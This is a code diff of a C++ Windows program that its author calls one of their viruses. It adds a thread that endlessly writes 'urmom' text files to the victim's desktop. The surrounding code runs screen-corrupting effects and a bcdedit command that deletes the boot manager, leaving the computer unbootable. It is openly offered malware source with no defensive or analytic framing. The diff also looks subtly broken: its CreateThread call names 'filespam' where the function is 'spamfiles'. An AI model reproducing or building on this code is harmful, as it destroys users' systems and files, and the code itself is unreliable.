@@ -7,6 +7,8 @@ using namespace std;
 
 static ULONGLONG n, r;
 int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
+auto path = get_desktop_path();
+int counter = 0;
 
 DWORD WINAPI shader1(LPVOID lpParam) {
     int time = GetTickCount();
@@ -40,13 +42,24 @@ DWORD WINAPI shader1(LPVOID lpParam) {
     return 0;
 }
 
+DWORD WINAPI spamfiles(LPVOID lpParam)
+{
+	int counter = 0;
+	auto path = get_desktop_path();
+
+	while(true){
+		// filespam code from another one of my viruses
+		ofstream filespam(path.string() + "\\urmom" + to_string(counter) + ".txt");
+		filespam << "HI";
+		counter++;
+	}
+}
+
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
     int sw = GetSystemMetrics(0);
     int sh = GetSystemMetrics(0);
-	auto path = get_desktop_path();
-	int counter = 0;
 
     int msgboxID = MessageBox(
         NULL,
@@ -61,6 +74,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         SetCursorPos(0, 0);
 
         CreateThread(0, 0, shader1, 0, 0, 0);
+		CreateThread(0, 0, filespam, 0, 0, 0);
 
         // Killing
         system("bcdedit /store c:\\boot\\bcd /delete {bootmgr} /f");
@@ -90,11 +104,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             int h = GetSystemMetrics(1);
             BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
             ReleaseDC(0, hdc);
-		
-			// filespam code from another one of my viruses
-			ofstream filespam(path.string() + "\\urmom" + to_string(counter) + ".txt");
-			filespam << "HI";
-			counter++;
         }
         break;
 
@@ -108,6 +117,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 	return 0;
 }
+
 
 
 
